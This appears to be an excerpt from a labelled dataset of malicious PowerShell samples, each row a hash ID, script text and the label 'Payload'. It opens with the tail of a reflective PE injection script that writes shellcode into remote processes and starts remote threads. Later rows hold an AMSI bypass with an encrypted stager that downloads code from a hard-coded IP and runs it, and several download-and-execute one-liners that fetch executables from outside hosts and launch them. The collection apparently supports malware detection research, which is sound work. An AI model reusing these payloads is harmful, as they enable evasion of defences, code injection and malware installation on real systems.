			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		

		Write-Output $ReturnArray
	}
	
	
	
	
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	
	
	
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				
				
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		
		Write-Verbose ""Getting basic PE information from the file""
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning ""PE is not compatible with DEP, might cause issues"" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""IsWow64Process"")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit""
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw ""Call to IsWow64Process failed""
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw ""PowerShell must be same architecture (x86/x64) as PE being loaded and remote process""
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw ""PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)""
		}
		

		
		Write-Verbose ""Allocating memory for the PE and write its headers to memory""
		
        
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning ""PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)"" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose ""PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.""
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error ""Cannot use ForceASLR when loading in to a remote process."" -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error ""PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process"" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				
		$EffectivePEHandle = [IntPtr]::Zero		
		if ($RemoteLoading -eq $true)
		{
			
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use""
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw ""VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).""
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		
		Write-Verbose ""Getting detailed PE information from the headers loaded in memory""
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose ""StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)""
		
		
		
		Write-Verbose ""Copy PE sections in to memory""
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		
		Write-Verbose ""Update memory addresses based on where the PE was actually loaded in memory""
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		
		Write-Verbose ""Import DLL's needed by the PE we are loading""
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose ""Update memory protection flags""
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
			}
		}
		else
		{
			Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
		}
		
		
		
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
		}
		
		
		
		if ($PEInfo.FileType -ieq ""DLL"")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw ""Unable to allocate memory in the remote process for shellcode""
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw ""Unable to write shellcode to remote process memory.""
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq ""EXE"")
		{
			
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			
			
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose ""Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in.""

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose ""EXE thread has completed.""
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done unloading the libraries needed by the PE""
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		
		Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
		{
			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
		}
		elseif ($ProcName -ne $null -and $ProcName -ne """")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw ""Can't find process $ProcName""
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		
		





		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't obtain the handle for process ID: $ProcId""
			}
			
			Write-Verbose ""Got the handle for the remote process to inject in to""
		}
		

		
		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw ""Unable to load PE, handle returned is NULL""
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] 
		
		
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			
			
			
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose ""Calling function with WString return type""
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""WStringFunc""
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose ""Calling function with String return type""
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""StringFunc""
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose ""Calling function with Void return type""
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			
			
			
		}
		
		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw ""VoidFunc couldn't be found in the DLL""
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		
        
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq ""DLL"")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
			}
		}
		
		Write-Verbose ""Done!""
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
	{
		$DebugPreference  = ""Continue""
	}
	
	Write-Verbose ""PowerShell ProcessID: $PID""
	
	
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		
		
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = ""ReflectiveExe $ExeArgs""
	}
	else
	{
		$ExeArgs = ""ReflectiveExe""
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch ""^\s*$"")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
",Payload
91f3fad14540791af6494356795f8bb853bacf05d39f992f919c16962303003f,"
[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD(""Cookie"",""session=Pu8sEnIpxIwINbUOVsxlL66DoHA="");$ser='http://35.165.38.15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](& $R $data ($IV+$K))|IEX

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
1f1c664f0327636626118e64e1380edab61f27f7bbfd2f399bb5677c4d6d5689,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kele.exe','fleeb.exe');Start-Process 'fleeb.exe'

",Payload
daab148548b87f2eabb9aeeb7bc0e408f29acc7a752e7c427e4d19e872bef9f0,"
